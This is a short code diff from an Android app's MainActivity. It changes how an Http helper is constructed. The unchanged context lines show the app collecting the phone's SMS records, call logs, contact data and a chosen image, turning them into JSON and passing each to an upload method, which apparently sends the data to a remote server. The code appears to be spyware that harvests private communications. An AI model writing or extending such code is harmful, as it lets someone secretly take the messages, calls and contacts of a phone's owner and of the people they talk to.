@@ -86,7 +86,7 @@ public class MainActivity extends AppCompatActivity {
             YLog.e("sms-mms", s);
             tv.setText(s);
             String a = JSON.toJSONString(list);
-            Http sp = new Http();
+            Http sp = new Http(this);
             sp.sms(a);
         } else {
             String s = "没有发现短信记录";
@@ -139,7 +139,7 @@ public class MainActivity extends AppCompatActivity {
             YLog.d("CallsYLog", s);
             tv.setText(s);
             final String a = JSON.toJSONString(list);
-            Http sp = new Http();
+            Http sp = new Http(this);
             sp.callLog(a);
         } else {
             String s = "没有发现通话记录";
@@ -420,7 +420,7 @@ public class MainActivity extends AppCompatActivity {
 //            YLog.d("", en.getValue().toString());
 //        }
         final String a = JSON.toJSONString(data);
-        Http sp = new Http();
+        Http sp = new Http(this);
         sp.phone(a);
         c.close();
     }
@@ -431,7 +431,7 @@ public class MainActivity extends AppCompatActivity {
             if (requestCode == 2020) {
                 tv.setText(data.toString());
                 YLog.d("", data.toString());
-                Http h = new Http();
+                Http h = new Http(this);
                 h.imageUpload(data.getData().toString());
             }
         }
